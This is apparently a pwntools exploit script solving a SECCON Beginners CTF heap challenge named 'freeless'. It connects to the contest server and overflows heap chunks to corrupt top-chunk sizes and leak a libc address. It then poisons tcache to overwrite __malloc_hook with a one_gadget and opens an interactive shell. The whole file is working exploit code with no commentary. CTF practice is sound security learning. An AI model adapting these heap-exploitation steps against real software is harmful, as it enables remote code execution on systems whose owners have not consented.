from pwn import *

elf = ELF('./chall')
libc = ELF('./libc-2.31.so')
context.binary = elf

#s = process('./chall', env={'LD_PRELOAD' : './libc-2.31.so'})
s = remote('freeless.quals.beginners.seccon.jp', 9077)

def new(index, size):
    s.sendlineafter('> ', '1')
    s.sendlineafter('index: ', str(index))
    s.sendlineafter('size: ', str(size))

def edit(index, data):
    s.sendlineafter('> ', '2')
    s.sendlineafter('index: ', str(index))
    s.sendlineafter('data: ', data)

def show(index):
    s.sendlineafter('> ', '3')
    s.sendlineafter('index: ', str(index))
    s.recvuntil('data: ')
    return s.recvline()[:-1]

A = 0 
B = 1
C = 2
D = 3
E = 4
F = 5
G = 6
    
new(A, 0x10)
edit(A, b'a'*0x18+pack(0xd51))
new(B, 0xd30)
new(C, 0xd20)

unsort = u64(show(C).ljust(8, b'\0'))
libc_base = unsort - (0x1ebb80 + 0x60)
libc.address = libc_base
print('libcbase:', hex(libc_base))

edit(B, b'b'*0xd38+pack(0x2c1))
new(D, 0xd30)
edit(D, b'd'*0xd38+pack(0x2c1))
new(E, 0x2a0)

edit(D, b'd'*0xd38+pack(0x2a1)+pack(libc.symbols.__malloc_hook))

new(F, 0x290)
new(G, 0x290)

one_gadget = libc_base + 0xe6c81

edit(G, p64(one_gadget))

new(G+1, 0)

s.interactive()
